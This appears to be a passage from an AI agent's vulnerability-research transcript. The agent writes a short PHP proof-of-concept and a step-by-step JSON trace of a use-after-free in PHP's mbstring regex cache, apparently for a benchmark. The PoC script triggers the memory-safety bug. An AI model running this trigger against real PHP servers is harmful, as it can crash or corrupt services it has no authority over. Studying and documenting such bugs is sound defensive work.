message:
Running command: cd /workspace && cat > poc.php <<'EOF'
<?php
mb_ereg_search_init('', '2');
mb_eregi_replace('2', '', '');
mb_ereg_search_pos();
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"arg_pattern","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"The attacker supplies a pattern for the persistent search regex state."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_eregi_replace)","line":1224,"var":"pattern","code":"re = php_mbregex_compile_pattern(pattern, pattern_len, options, enc, syntax);","note":"A second regex API compiles a pattern using the same module-wide cache machinery."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":470,"var":"MBREX(search_re)","code":"if (rc == MBREX(search_re)) { /* reuse the new rc? see bug #72399 */ MBREX(search_re) = NULL; }","note":"When the cache returns the same regex object, the global search_re pointer is cleared, leaving later search operations without a valid owner."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_pos)","line":1438,"var":"MBREX(search_re)","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"The search-position API dereferences the global search regex pointer that was invalidated by the cache-reuse path."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_pos)","line":1468,"var":"MBREX(search_re)","code":"if (onig_number_of_names(MBREX(search_re)) > 0) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"Named-group iteration can then read through the stale regex pointer and exercise the use-after-free sink."}
]
EOF

